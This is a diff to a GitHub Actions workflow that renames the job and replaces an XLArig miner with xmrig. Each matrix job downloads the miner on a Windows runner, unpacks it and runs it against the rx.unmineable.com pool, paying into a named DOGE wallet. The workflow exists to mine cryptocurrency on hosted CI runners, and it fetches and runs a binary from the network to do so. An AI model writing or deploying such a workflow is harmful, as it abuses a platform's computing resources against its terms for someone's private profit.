@@ -1,10 +1,10 @@
-name: eX-code_UMBL
+name: DOGEEEL
 
 on: [workflow_dispatch]
 
 jobs:
   build:
-    name: eX-code_UMBL
+    name: DOGEEEL
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -17,10 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
-      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-msvc-win64.zip -Outfile xmrig-6.15.0-msvc-win64.zip
     - name: Seting-UP
-      run: Expand-Archive XLArig-v5.2.2-win64.zip
+      run: Expand-Archive xmrig-6.15.0-msvc-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u DOGE:DDWsVj1g3GPEY4tFuqPGduG1tLh38AQJjQ.DOGEEW#7gin-nij1
+      run: .\xmrig-6.15.0\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u DOGE:DDWsVj1g3GPEY4tFuqPGduG1tLh38AQJjQ.DOGEEGITH#7gin-nij1
     - name: DONE
       run: exit
